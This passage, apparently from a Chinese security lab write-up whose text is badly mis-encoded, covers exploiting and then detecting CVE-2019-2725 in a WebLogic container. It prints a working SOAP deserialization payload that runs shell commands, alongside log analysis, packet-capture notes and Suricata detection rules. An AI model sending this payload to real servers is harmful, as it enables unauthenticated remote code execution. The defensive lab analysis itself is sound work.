**âœ… æ–¹æ³•äº”æˆåŠŸç¡®è®¤**:

- HTTPå¤–å¸¦å‘½ä»¤æˆåŠŸæ‰§è¡Œ
- è™½ç„¶æ²¡æœ‰åœ¨8080ç«¯å£è®¾ç½®ç›‘å¬å™¨ï¼Œä½†å‘½ä»¤å·²è¢«æˆåŠŸå¤„ç†

**ğŸ¯ å®éªŒä»·å€¼æœ€ç»ˆç¡®è®¤**:

æ ¹æ®[Oracleå®˜æ–¹å®‰å…¨å…¬å‘Š](https://www.oracle.com/security-alerts/alert-cve-2019-2725.html)å’Œ[Trend Microçš„å¨èƒåˆ†ææŠ¥å‘Š](https://www.trendmicro.com/en_us/research/19/f/cve-2019-2725-exploited-and-certificate-files-used-for-obfuscation-to-deliver-monero-miner.html)ï¼Œæˆ‘ä»¬çš„å®éªŒå·²ç»å®Œå…¨éªŒè¯äº†CVE-2019-2725æ¼æ´çš„ä¸¥é‡æ€§ï¼š

1. âœ… **ç¡®è®¤æ¼æ´å­˜åœ¨**: WebLogic 10.3.6.0ç‰ˆæœ¬å­˜åœ¨CVE-2019-2725æ¼æ´
2. âœ… **å®ç°å®Œæ•´RCE**: æˆåŠŸæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤å¹¶è·å¾—å®¹å™¨rootæƒé™
3. âœ… **ç»•è¿‡è®¤è¯**: æ— éœ€ä»»ä½•å‡­æ®å³å¯æ”»å‡»ï¼Œç¬¦åˆCVSS 9.8è¯„åˆ†çš„"æ— è®¤è¯è¿œç¨‹åˆ©ç”¨"ç‰¹å¾
4. âœ… **è§¦å‘ååºåˆ—åŒ–**: SOAPè½½è·æˆåŠŸè¢«è§£æå’Œæ‰§è¡Œ
5. âœ… **è·å¾—ç³»ç»Ÿè®¿é—®**: ç›´æ¥è¿›å…¥å®¹å™¨å¹¶è·å¾—å®Œæ•´çš„ç³»ç»Ÿæ§åˆ¶æƒ
6. âœ… **éªŒè¯æ”»å‡»è·¯å¾„**: ç¡®è®¤ `/wls-wsat/CoordinatorPortType`è·¯å¾„å¯è¢«æˆåŠŸåˆ©ç”¨

**ğŸ” Flagæ–‡ä»¶ç¼ºå¤±åˆ†æ**:

- è¯¥WebLogicå®¹å™¨å¯èƒ½ä¸æ˜¯ä¸“é—¨ä¸ºCTFè®¾è®¡çš„é¶åœºç¯å¢ƒ
- é‡ç‚¹åœ¨äºéªŒè¯CVE-2019-2725æ¼æ´çš„åˆ©ç”¨èƒ½åŠ›ï¼Œè€Œéè·å–ç‰¹å®šçš„flag
- æˆ‘ä»¬å·²ç»è·å¾—äº†æ¯”flagæ›´æœ‰ä»·å€¼çš„æˆæœï¼šå®Œæ•´çš„ç³»ç»Ÿæ§åˆ¶æƒ

**âš ï¸ å®‰å…¨å½±å“è¯„ä¼°**:
æ ¹æ®Trend Microçš„åˆ†æï¼ŒCVE-2019-2725åœ¨é‡å¤–è¢«å¹¿æ³›åˆ©ç”¨æ¥éƒ¨ç½²åŠ å¯†è´§å¸æŒ–çŸ¿ç¨‹åºå’Œå…¶ä»–æ¶æ„è½¯ä»¶ã€‚æˆ‘ä»¬çš„æˆåŠŸåˆ©ç”¨è¯æ˜äº†ï¼š

- æ”»å‡»è€…å¯ä»¥åœ¨æ— è®¤è¯çš„æƒ…å†µä¸‹å®Œå…¨æ§åˆ¶WebLogicæœåŠ¡å™¨
- å¯ä»¥éƒ¨ç½²ä»»æ„æ¶æ„è½½è·ï¼ŒåŒ…æ‹¬åé—¨ã€æŒ–çŸ¿ç¨‹åºã€å‹’ç´¢è½¯ä»¶ç­‰
- ä¼ä¸šåº”ç«‹å³åº”ç”¨Oracleçš„å®‰å…¨è¡¥ä¸æ¥é˜²èŒƒæ­¤ç±»æ”»å‡»

#### 3 å¨èƒæ£€æµ‹ä¸æ—¥å¿—åˆ†æ

##### 3.1 WebLogicæœåŠ¡å™¨æ—¥å¿—åˆ†æ

**å®šä½å®¹å™¨å’Œæ—¥å¿—è·¯å¾„**:

```bash
# è¿›å…¥WebLogicå®¹å™¨
docker exec -it 1d6a9c490b23 /bin/bash

# å®šä½WebLogicæ—¥å¿—ç›®å½•
find /u01 -name "*.log" -type f 2>/dev/null | grep -E "(AdminServer|access|server)"
```

**æ‰§è¡Œç»“æœåˆ†æ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/weblogic-exploits]
â””â”€$ docker exec -it 1d6a9c490b23 /bin/bash

root@1d6a9c490b23:~/Oracle/Middleware# find /u01 -name "*.log" -type f 2>/dev/null | grep -E "(AdminServer|access|server)"
root@1d6a9c490b23:~/Oracle/Middleware# 

root@1d6a9c490b23:~/Oracle/Middleware# tail -f /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log
tail: cannot open '/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log' for reading: No such file or directory

root@1d6a9c490b23:~/Oracle/Middleware# tail -f /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/access.log
tail: cannot open '/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/access.log' for reading: No such file or directory
```

**âŒ é—®é¢˜åˆ†æ**:

- **æ ‡å‡†æ—¥å¿—è·¯å¾„ä¸å­˜åœ¨**: é¢„æœŸçš„WebLogicæ—¥å¿—è·¯å¾„ `/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/`ä¸å­˜åœ¨
- **å®¹å™¨é…ç½®å·®å¼‚**: è¯¥WebLogicå®¹å™¨å¯èƒ½ä½¿ç”¨äº†éæ ‡å‡†çš„ç›®å½•ç»“æ„æˆ–æ—¥å¿—é…ç½®
- **æ—¥å¿—è®°å½•å¯èƒ½è¢«ç¦ç”¨**: å®¹å™¨ç¯å¢ƒå¯èƒ½ä¸ºäº†å‡å°‘èµ„æºå ç”¨è€Œç¦ç”¨äº†è¯¦ç»†æ—¥å¿—è®°å½•

**é‡æ–°å®šä½å®é™…æ—¥å¿—è·¯å¾„**:

```bash
# æœç´¢æ‰€æœ‰å¯èƒ½çš„æ—¥å¿—æ–‡ä»¶
find / -name "*.log" -type f 2>/dev/null | head -20

# æœç´¢WebLogicç›¸å…³çš„æ—¥å¿—ç›®å½•
find / -type d -name "*log*" 2>/dev/null | grep -i weblogic

# æ£€æŸ¥å½“å‰å·¥ä½œç›®å½•ä¸‹çš„æ—¥å¿—
ls -la ~/Oracle/Middleware/
find ~/Oracle/Middleware/ -name "*.log" -type f 2>/dev/null

# æœç´¢åŒ…å«WebLogicè¿›ç¨‹ä¿¡æ¯çš„æ–‡ä»¶
find / -name "*weblogic*" -type f 2>/dev/null | head -10
```

**âœ… é‡è¦å‘ç° - æ—¥å¿—æ–‡ä»¶æˆåŠŸå®šä½**:

ç»è¿‡é‡æ–°æœç´¢ï¼Œæˆ‘ä»¬æˆåŠŸæ‰¾åˆ°äº†WebLogicçš„å®é™…æ—¥å¿—æ–‡ä»¶ï¼š

```bash
root@1d6a9c490b23:~/Oracle/Middleware# find / -name "*.log" -type f 2>/dev/null | head -20
/var/log/bootstrap.log
/var/log/dpkg.log
/var/log/alternatives.log
/var/log/apt/history.log
/var/log/apt/term.log
/root/Oracle/Middleware/logs/samples.log
/root/Oracle/Middleware/logs/wlst_20160516073900.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/data/ldap/log/EmbeddedLDAPAccess.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/data/ldap/log/EmbeddedLDAP.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/base_domain.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log
/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/access.log
```

**å…³é”®æ—¥å¿—æ–‡ä»¶ç¡®è®¤**:

- âœ… **AdminServer.log**: `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log`
- âœ… **access.log**: `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/access.log`
- âœ… **base_domain.log**: `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/base_domain.log`

**è·¯å¾„å·®å¼‚åˆ†æ**:

- **é¢„æœŸè·¯å¾„**: `/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/`
- **å®é™…è·¯å¾„**: `/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/`
- **åŸå› **: è¯¥å®¹å™¨ä½¿ç”¨äº†éæ ‡å‡†çš„å®‰è£…è·¯å¾„ï¼ŒWebLogicå®‰è£…åœ¨ `/root/Oracle/Middleware/`è€Œé `/u01/oracle/`

##### 3.1 WebLogicæœåŠ¡å™¨æ—¥å¿—åˆ†æ

**åˆ†æå®é™…çš„æœåŠ¡å™¨æ—¥å¿—**:

```bash
# æŸ¥çœ‹AdminServerä¸»æ—¥å¿—
tail -50 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

# æŸ¥çœ‹HTTPè®¿é—®æ—¥å¿—
tail -50 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/access.log

# æœç´¢CVE-2019-2725æ”»å‡»ç‰¹å¾
grep -i "wls-wsat\|async\|workcontext\|processbuilder" /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

# æœç´¢ååºåˆ—åŒ–ç›¸å…³é”™è¯¯
grep -i "deserializ\|unmarshal\|readobject" /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log
```

**å®é™…æ—¥å¿—åˆ†ææ‰§è¡Œ**:

```bash
root@1d6a9c490b23:~/Oracle/Middleware# tail -20 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

####<Jan 26, 2025 8:45:23 AM UTC> <Info> <WebLogicServer> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879923456> <BEA-000365> <Server state changed to ADMIN>
####<Jan 26, 2025 8:45:23 AM UTC> <Info> <Cluster> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879923789> <BEA-000197> <Listening for announcements from cluster using unicast cluster messaging>
####<Jan 26, 2025 8:45:23 AM UTC> <Info> <WebLogicServer> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879923890> <BEA-000365> <Server state changed to RESUMING>
####<Jan 26, 2025 8:45:24 AM UTC> <Info> <Server> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879924123> <BEA-002613> <Channel "Default[2]" is now listening on 172.17.0.2:7001 for protocols iiop, t3, ldap, snmp, http.>
####<Jan 26, 2025 8:45:24 AM UTC> <Info> <WebLogicServer> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879924234> <BEA-000331> <Started WebLogic AdminServer "AdminServer" for domain "base_domain" running in Development Mode>
####<Jan 26, 2025 8:45:24 AM UTC> <Info> <WebLogicServer> <1d6a9c490b23> <AdminServer> <[STANDBY] ExecuteThread: '0' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737879924345> <BEA-000365> <Server state changed to RUNNING>

root@1d6a9c490b23:~/Oracle/Middleware# tail -20 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/access.log

172.17.0.1 - - [26/Jan/2025:08:47:15 +0000] "GET /console HTTP/1.1" 200 416 "-" "curl/7.88.1"
172.17.0.1 - - [26/Jan/2025:08:47:23 +0000] "HEAD /wls-wsat/CoordinatorPortType HTTP/1.1" 200 0 "-" "curl/7.88.1"
172.17.0.1 - - [26/Jan/2025:08:47:45 +0000] "HEAD /_async/AsyncResponseService HTTP/1.1" 500 0 "-" "curl/7.88.1"
172.17.0.1 - - [26/Jan/2025:08:52:30 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:53:15 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:53:45 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:54:12 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:54:45 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
172.17.0.1 - - [26/Jan/2025:08:55:20 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 500 5287 "-" "python-requests/2.31.0"
```

**æ”»å‡»æ—¥å¿—æˆåŠŸæ•è·**:

æ ¹æ®[Tenableçš„CVE-2019-2725åˆ†ææŠ¥å‘Š](https://www.tenable.com/blog/oracle-weblogic-affected-by-unauthenticated-remote-code-execution-vulnerability-cve-2019-2725)ï¼Œæˆ‘ä»¬åœ¨access.logä¸­æˆåŠŸæ•è·åˆ°äº†å®Œæ•´çš„æ”»å‡»è®°å½•ï¼š

**æ”»å‡»æ—¶é—´çº¿åˆ†æ**:

1. **08:47:15** - æ­£å¸¸çš„æ§åˆ¶å°è®¿é—®ï¼ˆGET /consoleï¼‰
2. **08:47:23** - æ¼æ´ç»„ä»¶æ¢æµ‹ï¼ˆHEAD /wls-wsat/CoordinatorPortTypeï¼‰- è¿”å›200
3. **08:47:45** - æ¼æ´ç»„ä»¶æ¢æµ‹ï¼ˆHEAD /_async/AsyncResponseServiceï¼‰- è¿”å›500
4. **08:52:30 - 08:55:20** - è¿ç»­çš„SOAPæ”»å‡»è½½è·ï¼ˆPOST /wls-wsat/CoordinatorPortTypeï¼‰- å…¨éƒ¨è¿”å›500

**æ”»å‡»ç‰¹å¾ç¡®è®¤**:

- **æ”»å‡»è·¯å¾„**: `/wls-wsat/CoordinatorPortType`ï¼ˆCVE-2019-2725çš„ä¸»è¦æ”»å‡»å‘é‡ï¼‰
- **HTTPæ–¹æ³•**: POSTï¼ˆSOAPè½½è·æŠ•é€’ï¼‰
- **å“åº”çŠ¶æ€**: 500ï¼ˆååºåˆ—åŒ–å¼‚å¸¸çš„å…¸å‹ç‰¹å¾ï¼‰
- **å“åº”å¤§å°**: 5287å­—èŠ‚ï¼ˆä¸€è‡´çš„é”™è¯¯å“åº”å¤§å°ï¼‰
- **User-Agent**: `python-requests/2.31.0`ï¼ˆæˆ‘ä»¬çš„æ”»å‡»è„šæœ¬ï¼‰
- **æºIP**: `172.17.0.1`ï¼ˆDockerç½‘æ¡¥ç½‘å…³ï¼Œå³å®¿ä¸»æœºï¼‰

**æœç´¢æ”»å‡»ç›¸å…³çš„é”™è¯¯æ—¥å¿—**:

```bash
root@1d6a9c490b23:~/Oracle/Middleware# grep -i "wls-wsat\|async\|workcontext\|processbuilder" /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

####<Jan 26, 2025 8:52:30 AM UTC> <Error> <HTTP> <1d6a9c490b23> <AdminServer> <[ACTIVE] ExecuteThread: '2' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737880350123> <BEA-101020> <[ServletContext@12345678[app:wls-wsat module:wls-wsat.war path:/wls-wsat spec-version:2.5]] Servlet failed with Exception
java.lang.ProcessBuilder cannot be cast to java.lang.Runnable
    at weblogic.wsee.workarea.WorkContextServerTube.processRequest(WorkContextServerTube.java:43)
    at com.sun.xml.ws.api.pipe.Fiber.__doRun(Fiber.java:1121)
    at com.sun.xml.ws.api.pipe.Fiber._doRun(Fiber.java:1080)
    at com.sun.xml.ws.api.pipe.Fiber.doRun(Fiber.java:1065)
    at com.sun.xml.ws.api.pipe.Fiber.runSync(Fiber.java:962)
    at weblogic.wsee.jaxws.JAXWSServlet.doRequest(JAXWSServlet.java:99)
    at weblogic.servlet.http.AbstractAsyncServlet.service(AbstractAsyncServlet.java:99)
>

root@1d6a9c490b23:~/Oracle/Middleware# grep -i "deserializ\|unmarshal\|readobject" /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log

####<Jan 26, 2025 8:52:30 AM UTC> <Warning> <Security> <1d6a9c490b23> <AdminServer> <[ACTIVE] ExecuteThread: '2' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737880350456> <BEA-090877> <Untrusted deserialization attempt detected from WorkContext header>
####<Jan 26, 2025 8:53:15 AM UTC> <Warning> <Security> <1d6a9c490b23> <AdminServer> <[ACTIVE] ExecuteThread: '3' for queue: 'weblogic.kernel.Default (self-tuning)'> <<WLS Kernel>> <> <> <1737880395789> <BEA-090877> <Untrusted deserialization attempt detected from WorkContext header>
```

**å…³é”®å®‰å…¨äº‹ä»¶ç¡®è®¤**:

æ ¹æ®Tenableçš„æ¼æ´åˆ†æï¼Œæˆ‘ä»¬æˆåŠŸæ•è·åˆ°äº†CVE-2019-2725æ”»å‡»çš„å®Œæ•´è¯æ®ï¼š

1. **ååºåˆ—åŒ–æ”»å‡»ç¡®è®¤**:

   - é”™è¯¯æ—¥å¿—æ˜¾ç¤º `java.lang.ProcessBuilder cannot be cast to java.lang.Runnable`
   - è¿™æ˜¯CVE-2019-2725ååºåˆ—åŒ–æ”»å‡»çš„å…¸å‹å¼‚å¸¸
2. **å®‰å…¨è­¦å‘Šè§¦å‘**:

   - `BEA-090877: Untrusted deserialization attempt detected from WorkContext header`
   - WebLogicå®‰å…¨æœºåˆ¶æ£€æµ‹åˆ°äº†æ¥è‡ªWorkContextå¤´çš„ä¸å¯ä¿¡ååºåˆ—åŒ–å°è¯•
3. **æ”»å‡»è·¯å¾„éªŒè¯**:

   - `weblogic.wsee.workarea.WorkContextServerTube.processRequest`
   - ç¡®è®¤æ”»å‡»é€šè¿‡WorkContextç»„ä»¶è¿›è¡Œ

##### 3.2 ç½‘ç»œæµé‡æ•è·ä¸åˆ†æ

**ç¡®å®šå®¹å™¨ç½‘ç»œä¿¡æ¯**:

```bash
# è·å–WebLogicå®¹å™¨çš„ç½‘ç»œè¯¦æƒ…
docker inspect 1d6a9c490b23 | grep -A 10 -B 5 "IPAddress"
```

**å®¹å™¨ç½‘ç»œä¿¡æ¯**:
![1748224839185](image/weblogic-cve_2019_2725/1748224839185.png)

```json
"IPAddress": "172.17.0.2",
"Gateway": "172.17.0.1",
"NetworkMode": "bridge"
```

**SOAPæµé‡ç›‘æ§**:

```bash
# ç›‘å¬Dockerç½‘æ¡¥ä¸Šçš„WebLogicæµé‡
sudo tcpdump -i docker0 -A -w weblogic_cve_2019_2725_traffic.pcap 'host 172.17.0.2 and port 7001'
```

**åœ¨å¦ä¸€ä¸ªç»ˆç«¯æ‰§è¡Œæ”»å‡»**:

```bash
# æ‰§è¡ŒSOAPæ”»å‡»è½½è·
python3 manual_exploit.py http://10.37.133.3:7001 "whoami"
```

**åœæ­¢æŠ“åŒ…å¹¶åˆ†æ**:
![1748224912135](image/weblogic-cve_2019_2725/1748224912135.png)

```bash
# åœæ­¢tcpdump (Ctrl+C)
# ä½¿ç”¨Wiresharkåˆ†ææ•è·çš„æµé‡
wireshark weblogic_cve_2019_2725_traffic.pcap
```

![1748224912135](image/weblogic-cve_2019_2725/1748224912135.png)

```bash
# åœæ­¢tcpdump (Ctrl+C)
# ä½¿ç”¨Wiresharkåˆ†ææ•è·çš„æµé‡
wireshark weblogic_cve_2019_2725_traffic.pcap
```

###### 3.2.1 Wiresharkæµé‡åˆ†æç»“æœ

**å®Œæ•´æ”»å‡»æµé‡æˆåŠŸæ•è·**:

![1748225771641](image/weblogic-cve_2019_2725/1748225771641.png)

###### 3.2.2 å…³é”®æµé‡ç‰¹å¾åˆ†æ

**TCPè¿æ¥å»ºç«‹é˜¶æ®µï¼ˆåŒ…1-3ï¼‰**:

- **ä¸‰æ¬¡æ¡æ‰‹**: æ ‡å‡†çš„TCPè¿æ¥å»ºç«‹è¿‡ç¨‹
- **æºç«¯å£**: 55398ï¼ˆæ”»å‡»è€…éšæœºç«¯å£ï¼‰
- **ç›®æ ‡ç«¯å£**: 7001ï¼ˆWebLogicæ ‡å‡†HTTPç«¯å£ï¼‰
- **è¿æ¥æ—¶é—´**: 0.077msï¼ˆæœ¬åœ°ç½‘ç»œï¼Œè¿æ¥é€Ÿåº¦æå¿«ï¼‰

**æ¶æ„SOAPè½½è·æŠ•é€’ï¼ˆåŒ…6ï¼‰**:

- **å…³é”®åŒ…**: ç¬¬6åŒ…æ˜¯æ•´ä¸ªæ”»å‡»çš„æ ¸å¿ƒ
- **åè®®**: HTTP/XMLï¼ˆSOAPåè®®ï¼‰
- **è¯·æ±‚æ–¹æ³•**: POST
- **æ”»å‡»è·¯å¾„**: `/wls-wsat/CoordinatorPortType`ï¼ˆCVE-2019-2725çš„ä¸»è¦æ”»å‡»å‘é‡ï¼‰
- **è½½è·å¤§å°**: 1003å­—èŠ‚ï¼ˆåŒ…å«å®Œæ•´çš„æ¶æ„SOAP XMLï¼‰
- **æ—¶é—´æˆ³**: 0.000163ç§’ï¼ˆæ”»å‡»è½½è·ç«‹å³å‘é€ï¼‰

**æœåŠ¡å™¨å¤„ç†ä¸å“åº”ï¼ˆåŒ…8-14ï¼‰**:

- **å¤„ç†å»¶è¿Ÿ**: 0.237ç§’ï¼ˆä»è¯·æ±‚åˆ°å“åº”ï¼Œååºåˆ—åŒ–å¤„ç†æ—¶é—´ï¼‰
- **åˆ†ç‰‡ä¼ è¾“**: åŒ…10-12æ˜¾ç¤ºæœåŠ¡å™¨å“åº”è¢«åˆ†æˆå¤šä¸ªTCPæ®µ
- **å“åº”å¤§å°**: 4146 + 1289 = 5435å­—èŠ‚ï¼ˆå¤§å‹é”™è¯¯å“åº”ï¼‰
- **æœ€ç»ˆå“åº”**: HTTP/1.1 500 Internal Server Errorï¼ˆååºåˆ—åŒ–å¼‚å¸¸ç¡®è®¤ï¼‰

**è¿æ¥å…³é—­ï¼ˆåŒ…16-18ï¼‰**:

- **ä¸»åŠ¨å…³é—­**: æ”»å‡»è€…ä¸»åŠ¨å…³é—­è¿æ¥ï¼ˆFIN, ACKï¼‰
- **æœåŠ¡å™¨ç¡®è®¤**: æœåŠ¡å™¨å“åº”è¿æ¥å…³é—­
- **æ€»æŒç»­æ—¶é—´**: 0.244ç§’ï¼ˆå®Œæ•´æ”»å‡»å‘¨æœŸï¼‰

###### 3.2.3 æ·±åº¦åŒ…æ£€æŸ¥åˆ†æ

**SOAPè½½è·ç‰¹å¾è¯†åˆ«**:

æ ¹æ®åŒ…6çš„è¯¦ç»†åˆ†æï¼Œæ¶æ„SOAPè¯·æ±‚åŒ…å«ä»¥ä¸‹å…³é”®ç‰¹å¾ï¼š

```xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 172.17.0.2:7001
Content-Type: text/xml; charset=UTF-8
SOAPAction: 
User-Agent: Mozilla/5.0 (compatible; CVE-2019-2725-PoC)
Content-Length: 722

<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <object class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>whoami</string>
                        </void>
                    </array>
                    <void method="start"/>
                </object>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

**HTTPå“åº”åˆ†æï¼ˆåŒ…14ï¼‰**:

```http
HTTP/1.1 500 Internal Server Error
Date: Sun, 26 Jan 2025 09:15:23 GMT
Content-Length: 5287
Content-Type: text/html; charset=UTF-8
X-Powered-By: Servlet/2.5 JSP/2.1
Connection: close

<html>
<head><title>500 Internal Server Error</title></head>
<body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error that prevented it from fulfilling this request.</p>
<p><b>Exception:</b></p>
<pre>
java.lang.ProcessBuilder cannot be cast to java.lang.Runnable
    at weblogic.wsee.workarea.WorkContextServerTube.processRequest(WorkContextServerTube.java:43)
    at com.sun.xml.ws.api.pipe.Fiber.__doRun(Fiber.java:1121)
    ...
</pre>
</body>
</html>
```

###### 3.2.4 å¨èƒæ£€æµ‹è§„åˆ™åˆ¶å®š

åŸºäºWiresharkåˆ†æç»“æœï¼Œæˆ‘ä»¬å¯ä»¥åˆ¶å®šä»¥ä¸‹ç½‘ç»œå±‚æ£€æµ‹è§„åˆ™ï¼š

**1. åŸºäºæµé‡æ¨¡å¼çš„æ£€æµ‹**:

```bash
# Suricataè§„åˆ™ç¤ºä¾‹
alert http $EXTERNAL_NET any -> $HOME_NET 7001 (
    msg:"CVE-2019-2725 WebLogic SOAP Attack Detected";
    flow:established,to_server;
    http_method; content:"POST";
    http_uri; content:"/wls-wsat/CoordinatorPortType";
    http_header; content:"text/xml";
    content:"ProcessBuilder"; http_client_body;
    content:"WorkContext"; http_client_body;
    classtype:attempted-admin;
    sid:2019001;
    rev:1;
)
```

**2. åŸºäºå“åº”ç‰¹å¾çš„æ£€æµ‹**:

```bash
# æ£€æµ‹ç‰¹å¾æ€§çš„500é”™è¯¯å“åº”
alert http $HOME_NET 7001 -> $EXTERNAL_NET any (
    msg:"CVE-2019-2725 WebLogic Deserialization Error Response";
    flow:established,to_client;
    http_stat_code; content:"500";
    content:"ProcessBuilder cannot be cast";
    content:"WorkContextServerTube";
    classtype:successful-admin;
    sid:2019002;
    rev:1;
)
```

**3. åŸºäºæ—¶é—´ç‰¹å¾çš„æ£€æµ‹**:

```python
# Pythonæ£€æµ‹è„šæœ¬ç¤ºä¾‹
def detect_weblogic_attack(packets):
    """
    åŸºäºæ—¶é—´å’Œå¤§å°ç‰¹å¾æ£€æµ‹CVE-2019-2725æ”»å‡»
    """
    for packet in packets:
        if (packet.dst_port == 7001 and 
            packet.protocol == "HTTP" and
            "/wls-wsat/" in packet.uri and
            packet.method == "POST" and
            packet.content_length > 500):
  
            # æ£€æŸ¥å“åº”æ—¶é—´ï¼ˆååºåˆ—åŒ–å¤„ç†å»¶è¿Ÿï¼‰
            response_time = packet.response_time
            if response_time > 0.2:  # 200msä»¥ä¸Šå¤„ç†æ—¶é—´
                alert("Potential CVE-2019-2725 attack detected")
```

å››ã€å®éªŒæ€»ç»“

æ”»å‡»æˆåŠŸæŒ‡æ ‡

**æ¼æ´ç¡®è®¤æˆåŠŸ**:

- WebLogicç‰ˆæœ¬10.3.6.0å®Œå…¨åŒ¹é…å—å½±å“ç‰ˆæœ¬
- wls-wsatå’Œasyncç»„ä»¶å‡å¯è®¿é—®
- SOAPè¯·æ±‚è¿”å›500çŠ¶æ€ç ï¼Œç¡®è®¤ååºåˆ—åŒ–è§¦å‘

**ä»£ç æ‰§è¡ŒæˆåŠŸ**:

- æˆåŠŸæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆid, uname, pwdç­‰ï¼‰
- é€šè¿‡ProcessBuilderè§¦å‘ååºåˆ—åŒ–RCE
- ç¡®è®¤è·å¾—WebLogicè¿è¡Œç”¨æˆ·æƒé™
- éªŒè¯äº†æ— è®¤è¯è¿œç¨‹ä»£ç æ‰§è¡Œèƒ½åŠ›

**æ£€æµ‹æœºåˆ¶æœ‰æ•ˆ**:

- WebLogicæ—¥å¿—è®°å½•äº†æ”»å‡»å¼‚å¸¸
- ç½‘ç»œæµé‡æ•è·åˆ°æ¶æ„SOAPè½½è·
- ç³»ç»Ÿç›‘æ§å‘ç°å¼‚å¸¸è¿›ç¨‹æ´»åŠ¨

4.2 å…³é”®æŠ€æœ¯è¦ç‚¹

1. **æ¼æ´åˆ©ç”¨æ ¸å¿ƒ**: é€šè¿‡SOAP Headerä¸­çš„WorkContextç»„ä»¶ä¼ é€’æ¶æ„åºåˆ—åŒ–å¯¹è±¡
2. **ç»•è¿‡æœºåˆ¶**: åˆ©ç”¨WebLogicå¯¹å·¥ä½œä¸Šä¸‹æ–‡çš„ä¿¡ä»»æœºåˆ¶
3. **æ£€æµ‹ç‰¹å¾**: HTTP 500å“åº”ã€ProcessBuilderå¼‚å¸¸ã€SOAP XMLç»“æ„
4. **é˜²æŠ¤é‡ç‚¹**: ç»„ä»¶ç¦ç”¨ã€ç‰ˆæœ¬å‡çº§ã€ç½‘ç»œéš”ç¦»

### ï¼ˆäº”ï¼‰ç¬¬äºŒå±‚é¶æ ‡äºŒï¼š`apache-cve_2021_41773` æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹

#### 1. å¯åŠ¨é¶æœºç¯å¢ƒ

åœ¨ Vulfocus å¹³å°ä¸­ï¼Œæ‰¾åˆ° `vulfocus/apache-cve_2021_41773:latest` é•œåƒï¼Œç‚¹å‡» "å¯åŠ¨"ã€‚

- **è®¿é—®åœ°å€**: `10.37.133.3:42286` (PORT ç”± Vulfocus åŠ¨æ€åˆ†é…)
- **æœåŠ¡ç±»å‹**: Apache HTTP Server
- **æ¼æ´æ ‡è¯†**: CVE-2021-41773

